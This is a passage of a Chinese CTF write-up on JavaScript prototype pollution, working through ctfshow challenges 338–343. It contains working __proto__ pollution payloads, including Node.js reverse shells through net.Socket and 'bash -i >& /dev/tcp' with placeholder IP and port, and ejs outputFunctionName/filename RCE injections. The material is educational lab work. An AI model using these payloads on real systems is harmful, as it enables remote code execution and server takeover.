class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">function <span class="hljs-keyword">merge</span>(target, source)&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> source)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> source &amp;&amp; <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> target)&#123;<br>            <span class="hljs-keyword">merge</span>(target[<span class="hljs-keyword">key</span>], source[<span class="hljs-keyword">key</span>])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>                target[<span class="hljs-keyword">key</span>] = source[<span class="hljs-keyword">key</span>]<br>        &#125;<br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>试一下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">let</span> o<span class="hljs-number">1</span> = &#123;&#125;<br><span class="hljs-attribute">let</span> o<span class="hljs-number">2</span> = &#123;a: <span class="hljs-number">1</span>,<span class="hljs-string">&quot;__proto__&quot;</span>: &#123;b: <span class="hljs-number">2</span>&#125;&#125;<br><span class="hljs-attribute">merge</span>(o<span class="hljs-number">1</span>, o<span class="hljs-number">2</span>)<br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">1</span>.a, o<span class="hljs-number">1</span>.b)<br><span class="hljs-attribute">o3</span> = &#123;&#125;<br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">3</span>.b)<br></code></pre></td></tr></table></figure><p>哑火了，payload 并没有达到我们的预期，用 JavaScript 创建 o2 的过程（let o2 = {a: 1, “__proto__“: {b: 2}}）中，__proto__已经代表 o2 的原型了，我们的键值相当于自定义了一个原型对象，没法在新的对象中添加__proto__键值，此时遍历 o2 的所有键名，拿到的只是[a, b]，__proto__并不是一个 key，自然也不会修改 Object 的原型。</p><p>那么，如何让__proto__被认为是一个键名呢？用 JSON 解析一下键值对(JSON.parse 会把一个 json 字符串 转化为 javascript 的 object)，将代码改成如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">let</span> o<span class="hljs-number">1</span> = &#123;&#125;<br><span class="hljs-attribute">let</span> o<span class="hljs-number">2</span> = JSON.parse(&#x27;&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">2</span>&#125;&#125;&#x27;) //?数组元素双引号<br><span class="hljs-attribute">merge</span>(o<span class="hljs-number">1</span>, o<span class="hljs-number">2</span>)<br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">1</span>.a, o<span class="hljs-number">1</span>.b)<br><span class="hljs-attribute">o3</span> = &#123;&#125;<br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">3</span>.b)<br></code></pre></td></tr></table></figure><p>可见，新建的 o3 对象，也存在 b 属性，说明 Object 已经被污染，因为 JSON 解析下，__proto__会被认为是一个真正的“键名”，而不代表“原型”，所以在遍 o2 时会存在这个键</p><p>merge 操作时最常见的可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题</p><p>有哪些情况原型链会被污染？哪些情况原型链能被修改呢？哪些情况下我们可以设置__proto__的值呢？<br>其实找找能够控制数组（对象）的“键名”的操作即可：</p><ul><li>对象 merge</li><li>对象 clone（其实内核就是将待操作的对象 merge 到一个空对象中）</li></ul><blockquote><p>存在影响目标类型的同型，该同型的参数可控</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E6%B1%A1%E6%9F%93.png"></p><p><strong>原型链污染</strong>利用的关键就是找到可以覆盖的属性或者方法。</p><p>这类漏洞的关键主要是在 compile 编译 截断，通过原型链污染覆盖某些属性，在编译过程中注入模板，在渲染的时候就会执行我们注入的恶意代码。</p><p>限制：</p><ul><li>保证能够执行到渲染阶段，因为覆盖某些属性会导致莫名其妙的异常</li><li>被覆盖的属性无硬编码默认值</li></ul><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="ctfshow338"><a href="#ctfshow338" class="headerlink" title="ctfshow338"></a>ctfshow338</h4><p>下载附件</p><blockquote><p>npm install</p><p>node bin/www</p></blockquote><p>index.js：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><br><span class="hljs-comment">/* GET home page. */</span><br>router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; title: <span class="hljs-string">&#x27;Express&#x27;</span> &#125;);<br>&#125;);<br>module.exports = router;<br></code></pre></td></tr></table></figure><p>login.js</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).json(),<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;;<br>  <span class="hljs-keyword">var</span> sess = req.session;<br>  let user = &#123;&#125;;<br>  utils.copy(user,req.body);<br>  <span class="hljs-keyword">if</span>(secert.ctfshow===<span class="hljs-string">&#x27;36dboy&#x27;</span>)&#123;<br>    res.end(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> res.json(&#123;ret_code: <span class="hljs-number">2</span>, ret_msg: <span class="hljs-string">&#x27;登录失败&#x27;</span>+JSON.stringify(user)&#125;);<br>  &#125;<br>&#125;);<br>module.exports = router;<br></code></pre></td></tr></table></figure><p>common.js</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">module.exports = &#123;<br>  copy:copy<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">copy</span>(<span class="hljs-params">object1, object2</span>)</span>&#123;<br>    <span class="hljs-keyword">for</span> (let key in object2) &#123;<br>        <span class="hljs-keyword">if</span> (key in object2 &amp;&amp; key in object1) &#123;<br>            copy(object1[key], object2[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            object1[key] = object2[key]<br>        &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>首页貌似没啥用，在 login.js 中看到 secert 没有 ctfshow 这个属性，而<code>secert.ctfshow===&#39;36dboy&#39;</code>就有 flag，我们发现 select 是一个数组，而 user 也是一个数组(具有同型)，而且通过<code>utils.copy(user,req.body)</code>传入数值(copy 和 merge 类比)，req.body 是 POST 请求(参数可控)</p><p>那么抓包传入即可</p><blockquote><p>{“__proto__“:{“ctfshow”:”36dboy”}}</p></blockquote><h4 id="ctfshow339"><a href="#ctfshow339" class="headerlink" title="ctfshow339"></a>ctfshow339</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;;<br>  <span class="hljs-keyword">var</span> sess = req.session;<br>  let user = &#123;&#125;;<br>  utils.copy(user, req.body);<br>  <span class="hljs-keyword">if</span> (secert.ctfshow === flag) &#123;<br>    res.end(flag);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> res.json(&#123; ret_code: <span class="hljs-number">2</span>, ret_msg: <span class="hljs-string">&#x27;登录失败&#x27;</span> + JSON.stringify(user) &#125;);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>和 338 不同的是 ctfshow===变量，我们可知最后的 32 位字符串就在这变量 flag，是不可预测的值；多了一个 api.js</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).json(),<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  res.render(<span class="hljs-string">&#x27;api&#x27;</span>, &#123; query: <span class="hljs-function"><span class="hljs-keyword">Function</span>(<span class="hljs-params">query</span>)(<span class="hljs-params">query</span>)&#125;)</span>;<br>&#125;);<br>module.exports = router;<br></code></pre></td></tr></table></figure><p>然后我们污染点一样，仍然是</p><blockquote><p>let user = {};<br>utils.copy(user,req.body);</p></blockquote><p>触发点：</p><blockquote><p>res.render(‘api’, { query: Function(query)(query)});</p></blockquote><p>匿名函数，和 Code-Breaking Thejs 很相像</p><blockquote><p>Function(query)(query)这种匿名函数的写法，query 不再是传数值，而是传入执行代码，然后自执行。有点和 eval 类似，但这里更好的解释是 Function 对象</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function</a></p><p>官方是这样定义的：<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F">IIFE（立即调用函数表达式）</a>是一个在定义时就会立即执行的 JavaScript 函数。</p></blockquote><p>然后想法是通过 login.js 的 copy 污染到 api.js 的 query，反弹一个 shell</p><p>js 如何反弹 shell<a href="https://xz.aliyun.com/t/7184">https://xz.aliyun.com/t/7184</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//js原生socket建立连接</span><br><span class="hljs-keyword">return</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> net = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;net&#x27;</span>),<br>    cp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>),<br>    sh = cp.spawn(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, [])<br>  <span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> net.Socket()<br>  client.connect(监听端口, <span class="hljs-string">&#x27;IP&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    client.pipe(sh.stdin)<br>    sh.stdout.pipe(client)<br>    sh.stderr.pipe(client)<br>  &#125;)<br>  <span class="hljs-keyword">return</span> <span class="hljs-regexp">/a/</span><br>&#125;)();<br><br><span class="hljs-comment">//污染传入</span><br>&#123;<br><span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br><span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;&quot;</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">//拼接</span><br>&#123;<br><span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br><span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;return (function () &#123;</span><br><span class="hljs-string">  var net = require(&#x27;net&#x27;),</span><br><span class="hljs-string">    cp = require(&#x27;child_process&#x27;),</span><br><span class="hljs-string">    sh = cp.spawn(&#x27;/bin/sh&#x27;, [])</span><br><span class="hljs-string">  var client = new net.Socket()</span><br><span class="hljs-string">  client.connect(监听端口, &#x27;IP&#x27;, function () &#123;</span><br><span class="hljs-string">    client.pipe(sh.stdin)</span><br><span class="hljs-string">    sh.stdout.pipe(client)</span><br><span class="hljs-string">    sh.stderr.pipe(client)</span><br><span class="hljs-string">  &#125;)</span><br><span class="hljs-string">  return /a/</span><br><span class="hljs-string">&#125;)();</span><br><span class="hljs-string">&quot;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要对上面的代码”格式化“，payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;query&quot;</span>: <span class="hljs-string">&quot;return (function()&#123;var net = require(&#x27;net&#x27;),cp = require(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(监听端口, &#x27;IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>传入拼接完成的 payload，post 传至/login，接着访问/api 触发后无响应，检查发现隧道启动成功，但是没有任何连接</p><p>解释如下：</p><ul><li>Function 中 require 是模块内的，无法调用全局变量</li></ul><p><a href="https://github.com/nodejs/node-v0.x-archive/issues/2017">https://github.com/nodejs/node-v0.x-archive/issues/2017</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211121223733792.png"></p><ul><li>因为 node 是基于 chrome v8 内核的，运行时，压根就不会有 <code>require</code> 这种关键字，模块加载不进来，自然 shell 就反弹不了了。但在 node 交互环境，或者写 js 文件时，通过 node 运行会自动把 <code>require</code> 进行编译。</li></ul><p><a href="https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js">https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211122000430212.png"></p><p><a href="https://stackoverflow.com/questions/4599857/are-eval-and-new-function-the-same-thing">https://stackoverflow.com/questions/4599857/are-eval-and-new-function-the-same-thing</a></p><p>此处的匿名函数原型是通过<code>new Function()</code>创建而来的，也就是说等价于上面的截图情形，没法直接在<code>Function</code>中引入 <code>require</code></p><p>总结就是，使用的是 nodejs 搭建的服务，可以使用 require，但它无法在匿名函数内调用全局变量(http)，换一种写法</p><blockquote><p>var require = global.require || global.process.mainModule.constructor._load||global.process.mainModule.require</p></blockquote><p>同时对于这个问题，我们看到 nodejs 是面向服务器端的，它具有 require 关键字，但在浏览器的控制台是没有的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">return</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> net = <span class="hljs-built_in">global</span>.process.mainModule.constructor._load(<span class="hljs-string">&#x27;net&#x27;</span>),<br>    cp = <span class="hljs-built_in">global</span>.process.mainModule.constructor._load(<span class="hljs-string">&#x27;child_process&#x27;</span>),<br>    sh = cp.spawn(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, []);<br>  <span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> net.Socket()<br>  client.connect(监听端口, <span class="hljs-string">&#x27;IP&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    client.pipe(sh.stdin)<br>    sh.stdout.pipe(client)<br>    sh.stderr.pipe(client)<br>  &#125;)<br>  <span class="hljs-keyword">return</span> <span class="hljs-regexp">/a/</span><br>&#125;)();<br><br>&#123;<br><span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br><span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;return (function () &#123;</span><br><span class="hljs-string">  var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),</span><br><span class="hljs-string">    cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),</span><br><span class="hljs-string">    sh = cp.spawn(&#x27;/bin/sh&#x27;, [])</span><br><span class="hljs-string">  var client = new net.Socket()</span><br><span class="hljs-string">  client.connect(监听端口, &#x27;IP&#x27;, function () &#123;</span><br><span class="hljs-string">    client.pipe(sh.stdin)</span><br><span class="hljs-string">    sh.stdout.pipe(client)</span><br><span class="hljs-string">    sh.stderr.pipe(client)</span><br><span class="hljs-string">  &#125;)</span><br><span class="hljs-string">  return /a/</span><br><span class="hljs-string">&#125;)();</span><br><span class="hljs-string">&quot;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;query&quot;</span>: <span class="hljs-string">&quot;return (function()&#123;var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(监听端口, &#x27;IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>或者：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;query&quot;</span>: <span class="hljs-string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/监听端口 0&gt;&amp;1\&quot;&#x27;)&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果是 windows 系统就把 <code>/bin/sh</code> 换成 <code>cmd.exe</code> 就可以了</p><h4 id="ctfshow-340"><a href="#ctfshow-340" class="headerlink" title="ctfshow 340"></a>ctfshow 340</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">var</span> router = express.Router()<br><span class="hljs-keyword">var</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>)<br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).json(), <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>)<br>  <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span><br>  <span class="hljs-keyword">var</span> user = <span class="hljs-keyword">new</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">this</span>.userinfo = <span class="hljs-keyword">new</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-built_in">this</span>.isVIP = <span class="hljs-literal">false</span><br>      <span class="hljs-built_in">this</span>.isAdmin = <span class="hljs-literal">false</span><br>      <span class="hljs-built_in">this</span>.isAuthor = <span class="hljs-literal">false</span><br>    &#125;)()<br>  &#125;)()<br>  utils.copy(user.userinfo, req.body)<br>  <span class="hljs-keyword">if</span> (user.userinfo.isAdmin) &#123;<br>    res.end(flag)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> res.json(&#123; <span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;登录失败&#x27;</span> &#125;)<br>  &#125;<br>&#125;)<br><span class="hljs-built_in">module</span>.exports = router<br></code></pre></td></tr></table></figure><p>这里面的 userinfo 原型不同了</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211122183340194.png"></p><p>再套一个<code>__proto__</code>即可</p><h4 id="ctfshow-341"><a href="#ctfshow-341" class="headerlink" title="ctfshow 341"></a>ctfshow 341</h4><p>这里介绍两个自动化找洞：</p><p>snyk 的使用</p><p>在官网注册登录，初次登录要关联 Github，找到 api，本地：</p><blockquote><p>npm install snyk -g</p><p>snyk config set api=</p><p>snyk test</p></blockquote><p>audit 的使用</p><blockquote><p>npm audit</p></blockquote><ul><li>ejs</li></ul><p>因为这题没有/api 触发点，使用 338 存在的 ejs RCE，因为是非预期没有放出来，使用 snyk 扫出来</p><p><a href="https://security.snyk.io/vuln/SNYK-JS-EJS-1049328">https://security.snyk.io/vuln/SNYK-JS-EJS-1049328</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;filename&quot;</span>:<span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/监听端口 0&gt;&amp;1&quot;</span>&#x27;);var __tmp2<span class="hljs-string">&quot;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>还有一个入口 outputFunctionName：<a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;outputFunctionName&quot;</span>: <span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/监听端口 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意到 login.js 的<code>this.userinfo = new function()&#123;...</code>所以上面的 payload 再嵌套一个<code>__proto__</code></p><h4 id="ctfshow342、343"><a href="#ctfshow342、343" class="headerlink" title="ctfshow342、343"></a>ctfshow342、343</h4><ul><li>jade</li></ul><p><a href="https://xz.aliyun.com/t/7025#toc-2">https://xz.aliyun.com/t/7025#toc-2</a></p><p><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade">https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124172124317.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124172422442.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124172602483.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124172725768.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124173907879.png"></p><p>js 调试真的一坨坨的 Orz</p><p>this.engine 跟进</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124174739562.png"></p><p>继续跟进</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124174952093.png"></p><p>可见返回值处：</p><blockquote><p>return handleTemplateCache(options)(options);</p></blockquote><p>跟进一下 handleTemplateCache</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125001447005.png"></p><p>跟一下 compile<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125001503138.png"></p><p>先看一下 parse</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125003052754.png"></p><p>parser 内，tokens 被内部 parse 后传到 compiler 被 compile，赋为 js 的值，js 被部分传入 body 内</p><p>看一下 compile，它是 compiler 的函数，去 node_module 找</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125003818514.png"></p><p>返回 buf 传回 